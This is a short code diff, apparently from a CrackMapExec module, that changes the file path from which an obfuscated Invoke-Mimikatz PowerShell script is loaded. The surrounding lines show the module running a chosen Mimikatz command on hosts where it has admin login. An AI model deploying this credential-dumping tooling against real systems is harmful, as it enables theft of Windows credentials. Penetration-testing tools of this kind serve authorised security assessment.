@@ -25,7 +25,7 @@ class CMEModule:
         if module_options and 'COMMAND' in module_options:
             self.command = module_options['COMMAND']
 
-        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
+        self.ps_script = obfs_ps_script('cme_powershell_scripts/Invoke-Mimikatz.ps1')
 
     def on_admin_login(self, context, connection):
         command = "Invoke-Mimikatz -Command '{}'".format(self.command)
